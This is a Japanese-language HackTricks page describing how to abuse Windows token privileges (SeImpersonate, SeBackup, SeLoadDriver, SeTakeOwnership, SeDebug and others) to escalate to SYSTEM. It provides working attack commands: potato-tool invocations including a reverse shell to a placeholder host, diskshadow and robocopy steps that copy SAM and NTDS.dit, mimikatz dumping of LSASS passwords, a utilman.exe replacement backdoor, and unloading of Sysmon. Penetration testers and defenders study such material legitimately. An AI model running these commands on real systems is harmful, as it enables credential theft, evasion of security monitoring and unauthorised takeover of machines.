# Tokens の悪用

{{#include ../../banners/hacktricks-training.md}}

## Tokens

**Windows Access Tokens について知らない場合は**、続行する前にこちらのページを読んでください:


{{#ref}}
access-tokens.md
{{#endref}}

**すでに持っている tokens を悪用して権限を昇格できる可能性があります**

### SeImpersonatePrivilege

この privilege は、ハンドルを取得できる場合に、任意の token を impersonation することをプロセスに許可します（ただし、token の作成はできません）。Windows service（DCOM）に exploit に対する NTLM authentication を実行させることで privileged token を取得でき、その後 SYSTEM privileges でプロセスを実行できるようになります。<sup>[[2]](#references)</sup> この vulnerability は、[juicy-potato](https://github.com/ohpe/juicy-potato)、[RogueWinRM](https://github.com/antonioCoco/RogueWinRM)（winrm が無効化されている必要があります）、[SweetPotato](https://github.com/CCob/SweetPotato)、[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) など、さまざまな tools を使用して exploit できます。

Modern operator 向けの注意事項:

- **JuicyPotato は legacy** です: Windows 10 1809+/Server 2019+ では、到達可能な RPC/COM surface に応じて、**GodPotato**、**SigmaPotato**、**PrintNotifyPotato**、**RoguePotato**、**SharpEfsPotato/EfsPotato**、または **PrintSpoofer** を優先してください。
- **`LOCAL SERVICE`** または **`NETWORK SERVICE`** として実行されている service を compromise し、`whoami /priv` に **filtered token** が表示され、`SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` がない場合は、まずアカウントの **default privilege set** を復元し（たとえば **FullPowers** を使用）、その後 potato family を再試行してください。<sup>[[3]](#references)</sup>
- 新しい fork の中には、元の tools より operator にとって使いやすいものがあります。たとえば、**SigmaPotato** は reflection/in-memory execution と modern Windows compatibility を追加し、**PrintNotifyPotato** は PrintNotify COM service を悪用するため、従来の Spooler path が無効化されている場合に有用なことがよくあります。
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege** と非常によく似ており、**同じ方法**を使用して特権トークンを取得します。\
この特権により、**新しいプロセスまたは一時停止中のプロセスにプライマリトークンを割り当てる**ことができます。特権付きの偽装トークンを使用して、プライマリトークンを派生させることができます（DuplicateTokenEx）。\
このトークンを使用して、'CreateProcessAsUser' により**新しいプロセス**を作成するか、プロセスを一時停止状態で作成して**トークンを設定**できます（通常、実行中のプロセスのプライマリトークンは変更できません）。<sup>[[2]](#references)</sup>

### SeTcbPrivilege

このトークンが有効になっている場合、**KERB_S4U_LOGON** を使用して、認証情報を知らなくても他の任意のユーザーの**偽装トークン**を取得し、トークンに**任意のグループ**（admins）を追加し、トークンの**整合性レベル**を "**medium**" に設定して、このトークンを**現在のスレッド**に割り当てることができます（SetThreadToken）。<sup>[[2]](#references)</sup>

### SeBackupPrivilege

この特権により、システムは任意のファイルに対する**すべての読み取りアクセス**制御を許可します（読み取り操作に限定）。これは、レジストリから**ローカル Administrator** アカウントのパスワードハッシュを**読み取る**ために利用され、その後、"**psexec**" や "**wmiexec**" などのツールをハッシュとともに使用できます（Pass-the-Hash technique）。ただし、この technique は、ローカル Administrator アカウントが無効になっている場合、またはリモート接続する Local Administrators から管理者権限を削除するポリシーが適用されている場合には機能しません。<sup>[[2]](#references)</sup>\
実際には、最も信頼性の高い組み込みの workflow は通常、**VSS + `robocopy /b`** です。シャドウコピーを作成して公開し、その後、**backup mode** で `SAM`/`SYSTEM` または `NTDS.dit` をコピーすることで、ファイル ACL を回避します。<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
この **privilege** は、以下の方法で **abuse** できます。

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) で **IppSec** をフォローする
- または、以下の **Backup Operators による privileges の escalation** セクションで説明されている方法:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

この privilege により、ファイルの Access Control List (ACL) に関係なく、あらゆるシステムファイルへの **write access** が可能になります。これにより、**services の変更**、DLL Hijacking の実行、Image File Execution Options による **debuggers** の設定など、さまざまな escalation 手法が可能になります。<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege は強力な permission であり、特に user が tokens を impersonate できる場合に有用ですが、SeImpersonatePrivilege がない場合にも利用できます。この機能は、現在の process と同じ user を表し、かつその integrity level が現在の process を超えない token を impersonate できるかどうかに依存します。<sup>[[2]](#references)</sup>

**Key Points:**

- **SeImpersonatePrivilege なしでの Impersonation:** 特定の条件下では、SeCreateTokenPrivilege を利用して tokens を impersonate することで EoP が可能です。
- **Token Impersonation の条件:** impersonation を成功させるには、対象の token が同じ user に属し、かつその integrity level が impersonation を試みる process の integrity level 以下である必要があります。
- **Impersonation Tokens の作成と変更:** user は impersonation token を作成し、privileged group の SID (Security Identifier) を追加して強化できます。

### SeLoadDriverPrivilege

この privilege により、`ImagePath` と `Type` に特定の値を設定した registry entry を作成して、**device drivers の load と unload** が可能になります。`HKLM` (HKEY_LOCAL_MACHINE) への直接の write access は制限されているため、代わりに `HKCU` (HKEY_CURRENT_USER) を利用する必要があります。ただし、driver configuration のために `HKCU` を kernel が認識できるようにするには、特定の path に従う必要があります。<sup>[[2]](#references)</sup>

現代の offensive use では、通常 **BYOVD** (bring your own vulnerable driver) が使われます。つまり、**signed だが vulnerable な** kernel driver を load し、その IOCTLs を使って protections を無効化するか、kernel code execution へ移行します。最近の Windows 11/Server builds では、**Microsoft vulnerable driver blocklist** および/または **HVCI/Memory Integrity** によって古い public chains が機能しなくなることが多いため、従来の `szkg64.sys` 形式の examples は、もはやすべての環境で信頼できるわけではありません。

この path は `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` です。ここで `<RID>` は現在の user の Relative Identifier です。`HKCU` 内にこの path 全体を作成し、2 つの values を設定する必要があります。<sup>[[2]](#references)</sup>

- `ImagePath`: 実行する binary への path
- `Type`: `SERVICE_KERNEL_DRIVER` (`0x00000001`) の value

**実行手順:**

1. write access が制限されているため、`HKLM` の代わりに `HKCU` に access します。
2. `<RID>` が現在の user の Relative Identifier を表すように、`HKCU` 内に `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` の path を作成します。
3. `ImagePath` に binary の execution path を設定します。
4. `Type` に `SERVICE_KERNEL_DRIVER` (`0x00000001`) を割り当てます。
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
この権限をabuseするその他の方法については、[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)を参照してください。

### SeTakeOwnershipPrivilege

これは**SeRestorePrivilege**と似ています。主な機能は、WRITE_OWNERアクセス権を付与することで、明示的な任意アクセス制御を回避し、プロセスが**オブジェクトの所有権を取得できるようにする**ことです。このプロセスでは、まず書き込み対象のレジストリキーの所有権を取得し、その後DACLを変更して書き込み操作を有効にします。<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

この権限により、メモリの読み取りと書き込みを含め、**他のプロセスをデバッグ**できます。この権限を使用すると、ほとんどの antivirus および host intrusion prevention solutions を回避できる、さまざまな memory injection の手法を利用できます。<sup>[[2]](#references)</sup>

最新の Windows では、`SeDebugPrivilege` があれば通常、**保護されていない SYSTEM プロセス**を開いてその token を複製するには十分ですが、**LSASS** にアクセスできる保証はありません。**RunAsPPL / LSA Protection** が有効な場合、`SeDebugPrivilege` が存在していても、保護されていないプロセスは LSASS を読み取ったり、LSASS に inject したりできません。その場合は、別の非 PPL SYSTEM プロセスから token を盗むか、`procdump` が機能すると想定せずに PPL bypass/BYOVD と chain してください。`SeDebugPrivilege` + `SeImpersonatePrivilege` を使用した完全な token-copy の例については、[こちらのページ](sedebug-+-seimpersonate-copy-token.md)を参照してください。

#### メモリをダンプ

[SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) の [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) を使用して、**プロセスのメモリを取得**できます。具体的には、ユーザーがシステムへのログインに成功した後にユーザー credentials を保存する **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** プロセスに対して使用できます。

その後、この dump を mimikatz に読み込ませて passwords を取得できます：
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

`NT SYSTEM` shellを取得したい場合は、以下を使用できます。

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

この権限（Perform volume maintenance tasks）により、raw volume device handle（例：\\.\C:）を開いて、NTFS ACLをバイパスする直接ディスクI/Oを実行できます。これにより、基盤ブロックを読み取ってボリューム上の任意のファイルのバイト列をコピーできるため、機密情報（例：%ProgramData%\Microsoft\Crypto\ 内のマシン秘密鍵、registry hives、VSS経由のSAM/NTDS）を任意に読み取れます。<sup>[[5]](#references)</sup> CA serversでは特に影響が大きく、CA private keyをexfiltrateすると、任意のprincipalになりすますためのGolden Certificateをforgeできます。<sup>[[6]](#references)</sup>

詳細なtechniquesとmitigations：

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## 権限を確認
```
whoami /priv
```
**Disabled** として表示される **tokens** は通常有効化できるため、_Enabled_ と _Disabled_ の両方の権限を悪用できることがよくあります。

### すべての tokens を有効化する

無効化された権限がある場合は、スクリプト [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) を使用して、すべての tokens を有効化できます：
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
または、この[**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)に埋め込まれている **script**。

## 表

完全な token privileges cheatsheet は [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) にあります。以下の概要では、admin session を取得したり機密ファイルを読み取ったりするために privilege を直接悪用する方法のみを記載します。<sup>[[1]](#references)</sup>

| Privilege                  | 影響      | ツール                    | 実行方法                                                                                                                                                                                                                                                                                                                                     | 備考                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"ユーザーが token を impersonate し、potato.exe、rottenpotato.exe、juicypotato.exe などの tools を使用して nt system へ privesc できるようになります"_                                                                                                                                                                                                      | 更新してくださった [Aurélien Chalot](https://twitter.com/Defte_) に感謝します。近いうちに、より recipe に近い形式で言い換える予定です。                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | `robocopy /b` または専用の SeBackup 対応 copy helpers を使用して機密ファイルを読み取る。                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`、`SECURITY`、`NTDS.dit`、場合によっては `%WINDIR%\MEMORY.DMP` に有効です。<br><br>- `robocopy` は便利ですが、専用の SeBackup cmdlets/APIs の方が、ロック中または開かれているファイルに対して柔軟なことがよくあります。</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken` を使用して、local admin rights を含む任意の token を作成する。                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **non-PPL** SYSTEM token を duplicate するか、non-protected process から memory を dump する。                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection が有効な場合、LSASS dumping は一般的にブロックされます。</p><p>Script は [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) にあります</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato family** / named-pipe impersonation を使用して SYSTEM を spawn する（`PrintSpoofer`、`RoguePotato`、`GodPotato`、`SigmaPotato`、`PrintNotifyPotato` など）。                                                                                                                                                                                    | <p>IIS APPPOOL、MSSQL、scheduled tasks などの service accounts、またはすでに `SeImpersonatePrivilege` を所有している context から実行するのが最も実用的です。</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. signed-but-vulnerable kernel driver（BYOVD）を load する<br>2. driver の IOCTLs を使用して kernel R/W を取得し、security tooling を disable するか、SYSTEM に elevate する<br><br>または、この privilege を使用して、<code>fltMC</code> builtin command で security-related drivers を unload することもできます。例：<code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code> などの古い public drivers は、vulnerable-driver blocklist / HVCI により、modern Windows ではますます block されるようになっています。</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege が存在する状態で PowerShell/ISE を launch する。<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a> を使用して privilege を enable する。<br>3. utilman.exe を utilman.old に rename する<br>4. cmd.exe を utilman.exe に rename する<br>5. console を lock して Win+U を押す</p> | <p>一部の AV software によって Attack が detect される場合があります。</p><p>Alternative method では、同じ privilege を使用して "Program Files" に保存された service binaries を replace します</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe を utilman.exe に rename する<br>4. console を lock して Win+U を押す</p>                                                                                                                                       | <p>一部の AV software によって Attack が detect される場合があります。</p><p>Alternative method では、同じ privilege を使用して "Program Files" に保存された service binaries を replace します。</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>local admin rights が含まれるように tokens を manipulate する。SeImpersonate が必要になる場合があります。</p><p>要検証。</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - exploitation paths from Windows privileges to admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Give Me Back My Privileges! Please?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
